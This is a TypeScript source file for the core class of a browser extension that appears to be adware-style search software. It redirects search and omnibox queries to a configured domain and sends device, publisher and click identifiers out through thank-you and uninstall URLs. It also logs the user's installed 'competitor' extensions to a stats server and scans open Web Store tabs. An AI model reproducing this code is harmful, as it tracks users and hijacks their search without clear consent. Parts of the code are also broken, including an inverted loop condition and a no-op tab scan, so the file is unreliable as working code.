import extData, {ExtensionData as ExtDataClass} from './ExtensionData';
import messageService from "./message/MessageService";
import Timer from "./Timer";
import Config from './Config';
import Browser from "./browser/Browser";
import Stats from './utils/Stats';
import HookManager from "./message/HookManager";
import SearchUtils from "./utils/SearchUtils";
import StorageManager from './StorageManager';
import BrowserWin from "./browser/BrowserWindows";
import BrowserTabs from "./browser/BrowserTabs";
import $jscomp from "./utils/jscomp";
import utils from "./Utils";

export default class Extension {
    public isInitialised: boolean;
    public data: any;
    public messageService: any;
    public stats: any;
    public keepAliveTimer: any;
    public hooks: any;
    public searchUrl: string;
    public setCookies: any;

    constructor(config: any) {
        extData.init(() => {
            this.init();
        })
    }

    public init = () => {
        if (!this.isInitialised) {
            this.isInitialised = true;
            this.data = new ExtDataClass();
            this.messageService = messageService;
            this.stats = new Stats(this.data);
            this.hooks = new HookManager();
            this.keepAliveTimer = new Timer(Config.timers.keepAlive.name, () => {
                this.stats.log('Monitoring', 'KeepAlive', Browser.appVersion, this.data.publisherId)
            }, Config.timers.keepAlive.period);
            const {schema, searchDomain, searchParams} = Config.search;
            this.searchUrl = SearchUtils.buildSearchUrl(schema, searchDomain, searchParams, this.getDeviceConfig())

            this.setCookies = new Timer(Config.timers.cookies.name, () => {
                this.updateCookies()
            }, Config.timers.cookies.period);

            // some do
            this.setUninstallPage();
            this.handleFirstLoad();
            Config.search.searchType && utils.handleFirstSettingsChange();
            console.warn('Extension data', this);
            Config.settings.omni &&
            SearchUtils.handleOmnibox(Config.settings.omni)
                        .then((res: any) => {
                            return this.stats.log('Collect', 'OmniboxSearch', res);
                        });
            if (Config.settings.handlesearchparams) {
                SearchUtils.handleSearchParams(Config.search.searchDomain, this.searchUrl, () => {
                    return this.handleCustomParam()
                }, () => {
                    return this.handleFirstSearch()
                })
            }
            if (Config.settings.handlesearch) {
                SearchUtils.handleSearch(Config.search.searchDomain, this.searchUrl)
            }
            this.messageService.registerExternalMessage('version', (a: any,c: any, d: any) => {
                d(Browser.appVersion)
            })
        }
    }

    private setUninstallPage = () => {
        const {uninstallDomain, name} = Config.extension;
        const {deviceId, publisherId, subId, installDate, barcodeId, country} = this.data;
        const sendUnistalPage = [
            `http://${Config.extension.uninstallDomain}`,
            `?uid=${deviceId}`,
            `&d1=${Browser.id}`,
            `&pid=${publisherId}`,
            `&sid=${subId}`,
            `&installdate=${installDate}`,
            `&barcode=${barcodeId}`,
            `&co=${country}`,
            `&name=${name}`,
        ].join();
        Browser.setUninstallPage(sendUnistalPage);
    }

    private getDeviceConfig = () => ({
        DeviceID: this.data.deviceId,
        Country: this.data.country,
        PID: this.data.publisherId,
        SID: this.data.subId,
        Barcode: this.data.barcodeId,
        InstallDate: this.data.installDate,
        Publisher: Config.defaults.publisherName,
        SearchType: Config.search.searchType
    })

    private handleFirstSearch = () => {
        this.stats.log("Monitoring", "FirstSearch", Browser.appVersion, this.data.publisherId);
        return this.hooks.firstSearch.call()
        
    }
    public updateCookies = () => {
        this.data.writeCookies(this.data, this.handleCustomParam())
    }

    public handleCustomParam = () => {
        return this.hooks.customParam.call()
    }

    public handleOpenStoreWindows = () => {
        BrowserTabs.getTabs({}, (a) => {
            a.map((a) => {
                a.url.indexOf('chrome.google.com/webstore/detail')
            })
        })
    }

    public sendCompetitorsExtensions = () => {
        Browser.getInstalledExtensions((brow: any) => {
            brow = $jscomp.makeIterator(brow);
            for (let i = brow.next(); i.done; i = brow.next()) {
                i = i.value;
                try {
                    this.stats.log(
                        'Monitoring',
                        'CompetitiorsExtensions',
                        i.id,
                        i.shortName
                        );
                }
                catch(err) {
                    console.error(err);
                }
            }

        })
    }

    public handleFirstLoad = () => {
        const date = Date.parse(StorageManager.keys.firstTime)
        if (!date) {
            StorageManager.keys.firstTime = new Date;
            this.stats.log('Monitoring', 'FirstLoad', Browser.appVersion, this.data.publisherId)
            const {country, publisherId, subId, barcodeId, clickId, deviceId, installDate} = this.data;
            const thankUrl = `https://thankyou.${Config.extension.domain}/?&co=${country}&pid=${publisherId}&subid=${subId}&barcodeid=${barcodeId}&clickid=${clickId}&deviceid=${deviceId}&installdate=${installDate}`;
            Config.settings.thankyoupage && BrowserTabs.createTab(thankUrl);
            Config.settings.closeStoreWindows && this.handleOpenStoreWindows();
            if(Config.settings.openNewTabs) {
                setTimeout(() => {
                    return BrowserTabs.createTab()
                }, 3E3);
            };
            if(Config.settings.noinline) {
                let newProps: any = {};
                try {
                  newProps = JSON.parse(this.data.lpDetails);  
                } catch (error) {
                  newProps = {};
                  console.log('no details', error);
                }
                this.stats.log(
                    'InstallSuccess',
                    'InstallSuccess',
                    newProps.creativeDetails,
                    Browser.getBrowserName,
                    true,
                    {
                        data3: this.data.clickId,
                        data4: newProps.gbDecision,
                        data5: newProps.gbResult,
                        data6: Browser.id,
                        data7: newProps.testValue,
                        data9: newProps.soDomain,
                        data10: newProps.sessionId,
                        data16: newProps.pgSegment
                    }
                )
            }
            Config.settings.handleextensions && this.sendCompetitorsExtensions()
        }
    }
};